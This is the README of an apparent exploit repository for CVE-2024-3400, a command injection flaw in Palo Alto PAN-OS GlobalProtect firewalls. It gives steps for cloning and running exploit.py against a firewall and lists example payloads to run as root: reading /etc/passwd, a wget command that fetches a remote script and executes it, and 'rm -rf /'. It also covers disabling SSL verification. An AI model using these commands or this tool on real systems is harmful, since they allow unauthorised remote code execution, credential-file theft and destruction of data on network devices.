# PAN-OS Firewall Exploit Script
This script is designed to demonstrate the exploitation of vulnerabilities in PAN-OS firewalls. It sends a specially crafted payload to the firewall's API endpoint to execute arbitrary commands. This exploit specifically targets CVE-2024-3400, a command injection vulnerability in the GlobalProtect feature of Palo Alto Networks PAN-OS software for specific PAN-OS versions. Distinct feature configurations may enable an unauthenticated attacker to execute arbitrary code with root privileges on the firewall.

**Note:** Please ensure that you only use this script for legal and ethical purposes, and only on machines that you have permission to test on.

## Usage

To use this project, follow these steps:

1. Clone this repo:
   ```bash
   git clone https://github.com/DrewskyDev/CVE-2024-3400

2. Change directory to the repo:
   ```bash
   cd CVE-2024-3400

3. Install the required modules:
   ```bash
   pip install -r requirements.txt

4. Run the python script.
   ```bash
   python3 exploit.py

Follow the prompts to enter the IP address of the vulnerable PAN-OS firewall and the payload to execute.

## Example Payloads

1. List Directory Contents:
   ```bash
   ls -la

2. Print the contents of a specific file:
   ```bash
   cat /etc/passwd

3. Print the username of the current user who is logged in to the system:
   ```bash
   whoami
   
4. Download a file from the internet (requires wget or curl installed):
   ```bash
   wget http://example.com/malicious_script.sh -O /tmp/malicious_script.sh && chmod +x /tmp/malicious_script.sh && /tmp/malicious_script.sh

5. Be very careful with this one:
   ```bash
   rm -rf /

## Instructions for Secure Usage
### SSL Certificate Verification
The script will automatically ask for the file path of the SSL certificate from the PAN-OS firewall server. If no path is given, the script will automatically set SSL verification to false, effectively disabling SSL.

If you have the root CA certificate of the PAN-OS firewall server, you can manually specify its path using the verify parameter in the script (line 18).

 - Example:
   ```bash
   response = requests.post(url, headers=headers, data=data, timeout=5, verify='/path/to/root_CA_certificate.pem')
